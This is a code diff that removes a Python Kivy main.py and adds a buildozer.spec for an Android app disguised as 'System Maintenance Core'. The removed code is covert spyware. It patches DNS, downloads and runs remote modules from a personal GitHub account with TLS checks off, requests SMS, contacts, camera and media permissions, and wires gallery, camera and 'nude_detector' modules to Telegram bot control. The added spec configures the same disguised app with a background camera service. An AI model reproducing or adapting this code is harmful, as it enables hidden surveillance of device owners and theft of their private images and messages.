@@ -1,337 +1,60 @@
-# -*- coding: utf-8 -*-
-import os
-import sys
-import threading
-import importlib
-import requests
-import traceback
-import gc
-import time
-import socket
-import random
-from datetime import datetime
-from kivy.app import App
-from kivy.uix.textinput import TextInput
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.button import Button
-from kivy.clock import Clock
-from kivy.core.clipboard import Clipboard
+[app]
 
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# ====== هوية التطبيق (الإصدار 4.2.0 - دعم AI المحمل ديناميكياً) ======
+title = System Maintenance Core
+package.name = com.sys.shield.v4
+package.domain = org.sys.core
+version = 4.2.0
 
-# ========== 1. تجاوز DNS (شامل api.telegram.org) ==========
-def _patch_dns():
-    original_getaddrinfo = socket.getaddrinfo
-    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
-        override = {
-            'raw.githubusercontent.com': [
-                '185.199.108.133', '185.199.109.133',
-                '185.199.110.133', '185.199.111.133'
-            ],
-            'api.telegram.org': [
-                '149.154.167.220', '149.154.167.221',
-                '149.154.167.99', '149.154.175.50'
-            ],
-            'zaen1993.github.io': [
-                '185.199.108.153', '185.199.109.153',
-                '185.199.110.153', '185.199.111.153'
-            ],
-            'cdn.jsdelivr.net': [
-                '151.101.2.229', '151.101.66.229', '151.101.130.229'
-            ]
-        }
-        if host in override:
-            fake_ip = random.choice(override[host])
-            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
-        return original_getaddrinfo(host, port, family, type, proto, flags)
-    socket.getaddrinfo = patched_getaddrinfo
+# ====== المصادر والملفات (تم تقليل الملحقات لتصغير الحجم) ======
+source.dir = .
+source.include_exts = py,png,jpg,kv,json,xml,txt,db
+# أزلنا tflite من هنا لأن الموديل سيتم تحميله خارج حزمة APK
+source.include_patterns = res/*
+source.exclude_dirs = tests, __pycache__, docs, .github, venv, bin, .buildozer, assets
+source.exclude_patterns = */test/*, */tests/*, *.pyc, */__pycache__/*, *.tflite
 
-_patch_dns()
+# ====== المكتبات الأساسية (التركيبة الذهبية لنجاح البناء) ======
+# numpy==1.26.4 هو الإصدار المستقر الذي لا يسبب خطأ 404
+# tflite-runtime هو المحرك الخفيف البديل لـ tensorflow الثقيلة
+requirements = python3, hostpython3, kivy==2.3.0, pillow, requests, certifi, pyjnius, android, pyzipper, numpy==1.26.4, tflite-runtime==2.14.0
 
-# ========== 2. روابط index.json (مع إلغاء التخزين المؤقت) ==========
-INDEX_BASE_URLS = [
-    "https://zaen1993.github.io/Android-Core/index.json",
-    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
-    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
-    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json"
-]
+# ====== أيقونة التطبيق ======
+icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
 
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Cache-Control': 'no-cache',
-    'Pragma': 'no-cache'
-}
+# ====== الصلاحيات (متوافقة مع متطلبات النظام الحديثة) ======
+android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, WAKE_LOCK, FOREGROUND_SERVICE, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_DATA_SYNC, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO
 
-# ========== 3. المسارات الأساسية ==========
-def _get_path():
-    try:
-        from jnius import autoclass
-        act = autoclass('org.kivy.android.PythonActivity').mActivity
-        base = act.getFilesDir().getPath()
-        p = os.path.join(base, ".sys_runtime")
-    except Exception:
-        p = os.path.join(os.getcwd(), ".sys_runtime")
-    os.makedirs(p, exist_ok=True)
-    return p
+# ====== إعدادات SDK/NDK المستقرة ======
+android.api = 33
+android.minapi = 24
+android.sdk = 33
+android.ndk = 25b
+android.ndk_api = 24
+android.accept_sdk_license = True
 
-R = _get_path()
-U = os.path.join(R, "updates")
-os.makedirs(U, exist_ok=True)
+# ====== تم حذف ملف AndroidManifest.xml نهائياً ======
+# android.manifest = AndroidManifest.xml
 
-HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
-os.makedirs(HARVEST_QUEUE, exist_ok=True)
+# ====== المعمارية المستهدفة (تحسين لأجهزة POCO F3 وأشباهها) ======
+# استخدام معمارية واحدة يقلل حجم APK بنسبة 50% تقريباً
+android.archs = arm64-v8a
 
-# إنشاء مجلد النماذج (لسنا بحاجة لملف .nomedia فيه)
-MODELS_DIR = os.path.join(R, "models")
-os.makedirs(MODELS_DIR, exist_ok=True)
+# ====== خدمات الخلفية والطاقة ======
+android.foreground = True
+android.foreground_service_type = dataSync|camera
+android.wakelock = True
 
-if R not in sys.path:
-    sys.path.insert(0, R)
+# ====== تحسينات الأداء والحجم ======
+android.no_byte_compile_python = False
+android.optimize_python = True
+android.release_artifact = apk
+android.strip = True
 
-# ========== 4. الأذونات واستثناء البطارية ==========
-def _perms():
-    try:
-        from android.permissions import request_permissions, Permission
-        request_permissions([
-            Permission.INTERNET,
-            Permission.CAMERA,
-            Permission.RECORD_AUDIO,
-            Permission.READ_EXTERNAL_STORAGE,
-            Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.READ_CONTACTS,
-            Permission.READ_SMS,
-            Permission.WAKE_LOCK,
-            Permission.ACCESS_NETWORK_STATE,
-            Permission.ACCESS_WIFI_STATE,
-            "android.permission.FOREGROUND_SERVICE",
-            "android.permission.POST_NOTIFICATIONS",
-            "android.permission.READ_MEDIA_IMAGES",
-            "android.permission.READ_MEDIA_VIDEO",
-            "android.permission.READ_MEDIA_AUDIO"
-        ])
-    except Exception as e:
-        print(f"Permissions error: {e}")
+# ====== واجهة المستخدم ======
+orientation = portrait
+fullscreen = 1
 
-    try:
-        from jnius import autoclass
-        PowerManager = autoclass('android.os.PowerManager')
-        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
-        pm = ctx.getSystemService(ctx.POWER_SERVICE)
-        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
-            Intent = autoclass('android.content.Intent')
-            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-            from android.net import Uri
-            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
-            ctx.startActivity(intent)
-    except Exception as e:
-        print(f"Battery exemption error: {e}")
-
-# ========== 5. تطبيق Kivy الرئيسي ==========
-class CoreApp(App):
-    def build(self):
-        self.title = "System Core v4.2"
-        layout = BoxLayout(orientation='vertical', spacing=5)
-
-        self.log = TextInput(
-            text="", readonly=True,
-            background_color=(0.02, 0.02, 0.02, 1),
-            foreground_color=(0.3, 0.9, 0.3, 1),
-            font_size='10sp'
-        )
-
-        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
-        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
-        copy_btn.bind(on_press=self._copy)
-        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
-        clear_btn.bind(on_press=self._clear)
-
-        btns.add_widget(copy_btn)
-        btns.add_widget(clear_btn)
-
-        layout.add_widget(self.log)
-        layout.add_widget(btns)
-
-        Clock.schedule_once(self._start, 0.5)
-        return layout
-
-    def _copy(self, _):
-        Clipboard.copy(self.log.text)
-        self._log("Log copied to clipboard")
-
-    def _clear(self, _):
-        self.log.text = ""
-
-    def _log(self, msg, lvl="INFO"):
-        ts = datetime.now().strftime("%H:%M:%S")
-        def upd(dt):
-            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
-            if len(self.log.text) > 15000:
-                self.log.text = self.log.text[-8000:]
-            self.log.cursor = (0, len(self.log.text))
-        Clock.schedule_once(upd, 0)
-
-    def _verify_module(self, file_path, module_name):
-        if not os.path.exists(file_path):
-            return False
-        try:
-            with open(file_path, 'r', encoding='utf-8') as f:
-                content = f.read()
-            if len(content) < 200:
-                return False
-            compile(content, module_name, 'exec')
-            return True
-        except Exception as e:
-            self._log(f"Verification error ({module_name}): {e}", "ERROR")
-            return False
-
-    def _download_file(self, url, dest_path, is_binary=False):
-        """تحميل ملف (نصي أو ثنائي) مع تجاوز الكاش"""
-        url_with_cache_buster = f"{url}?t={int(time.time())}"
-        try:
-            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=30, verify=False, stream=is_binary)
-            if resp.status_code == 200:
-                if is_binary:
-                    with open(dest_path, 'wb') as f:
-                        for chunk in resp.iter_content(chunk_size=8192):
-                            if chunk:
-                                f.write(chunk)
-                else:
-                    with open(dest_path, 'w', encoding='utf-8') as f:
-                        f.write(resp.text)
-                return True
-        except Exception as e:
-            self._log(f"Download error for {url}: {e}", "WARN")
-        return False
-
-    def _start(self, _):
-        threading.Thread(target=self._run, daemon=True).start()
-
-    def _run(self):
-        _perms()
-        self._log("🚀 Shield Core v4.2 starting...", "BOOT")
-
-        # --- 1. جلب index.json ---
-        all_files = []
-        assets_list = []
-        for base_url in INDEX_BASE_URLS:
-            try:
-                url = f"{base_url}?t={int(time.time())}"
-                self._log(f"Fetching index from {base_url.split('/')[2]}...")
-                resp = requests.get(url, headers=HEADERS, timeout=15, verify=False)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    all_files = data.get('files', [])
-                    assets_list = data.get('assets', [])
-                    self._log(f"📄 Found {len(all_files)} modules and {len(assets_list)} assets.")
-                    break
-                else:
-                    self._log(f"Index returned HTTP {resp.status_code}", "WARN")
-            except Exception as e:
-                self._log(f"Index error: {e}", "WARN")
-        else:
-            self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
-
-        # --- 2. تحميل ملفات Python ---
-        for file_url in all_files:
-            filename = file_url.split('/')[-1]
-            if filename == "main.py":
-                continue
-            dest = os.path.join(R, filename)
-            if not os.path.exists(dest):
-                if self._download_file(file_url, dest, is_binary=False):
-                    self._log(f"✅ Downloaded {filename}")
-                else:
-                    self._log(f"❌ Failed to download {filename}", "ERROR")
-
-        # --- 3. تحميل الموديل (ملف ثنائي) ---
-        for asset_url in assets_list:
-            if asset_url.endswith('.tflite'):
-                model_dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
-                if not os.path.exists(model_dest):
-                    self._log("📥 Downloading AI model (5.19 MB)...")
-                    if self._download_file(asset_url, model_dest, is_binary=True):
-                        self._log("✅ AI model downloaded successfully")
-                    else:
-                        self._log("❌ Failed to download AI model", "ERROR")
-                else:
-                    self._log("✅ AI model already present")
-
-        time.sleep(1)
-
-        # --- 4. تنظيف الموديولات القديمة ---
-        self._log("🧹 Cleaning memory...")
-        modules_to_remove = [
-            "monitor", "telegram_ui", "commands",
-            "media_scanner", "daily_zipper", "gallery_browser",
-            "camera_analyzer", "nude_detector"
-        ]
-        for mod in modules_to_remove:
-            if mod in sys.modules:
-                del sys.modules[mod]
-        importlib.invalidate_caches()
-        gc.collect()
-
-        # --- 5. تحميل الأسرار من config.py ---
-        telegram_path = os.path.join(R, "telegram_ui.py")
-        if not os.path.exists(telegram_path):
-            self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
-            return
-
-        try:
-            import config
-            importlib.reload(config)
-            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = config.load_config()
-            self._log("🔐 Configuration loaded securely.")
-        except Exception as e:
-            self._log(f"❌ Failed to load config: {e}", "ERROR")
-            return
-
-        # --- 6. إقلاع النظام الأساسي ---
-        try:
-            import monitor
-            import telegram_ui
-            import commands
-
-            importlib.reload(monitor)
-            importlib.reload(telegram_ui)
-            importlib.reload(commands)
-
-            UI_Class = getattr(telegram_ui, 'T', None)
-            if UI_Class:
-                mon = monitor.M()
-                random.seed(mon.did)
-                self._log(f"🆔 Device ID: {mon.did[:8]}... | Cluster seed set")
-
-                ui = UI_Class(
-                    m=mon,
-                    active_tokens=active_tokens,
-                    reserve_tokens=reserve_tokens,
-                    ctrl_id=ctrl_id,
-                    vault_id=vault_id,
-                    app_password=secret_password
-                )
-                mon.ui = ui
-                mon.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, mon, cid, cbq)
-
-                ui.start()
-                mon.start()
-                self._log("🎉 SYSTEM ONLINE (AI Model Ready)", "SUCCESS")
-                self._log(f"Device: {mon.did} | Model: {mon.dmd}")
-                self._log(f"Active bots: {len(active_tokens)} | Reserve: {len(reserve_tokens)}")
-            else:
-                self._log("❌ Class 'T' missing in telegram_ui.py", "ERROR")
-        except Exception as e:
-            self._log(f"FATAL ERROR: {e}", "ERROR")
-            self._log(traceback.format_exc(), "TRACE")
-            Clock.schedule_once(lambda dt: self._start(None), 60)
-
-    def on_pause(self):
-        return True
-
-    def on_stop(self):
-        self._log("App stopped. Restarting service if needed.")
-        return True
-
-if __name__ == '__main__':
-    CoreApp().run()
+[buildozer]
+log_level = 2
+warn_on_root = 1
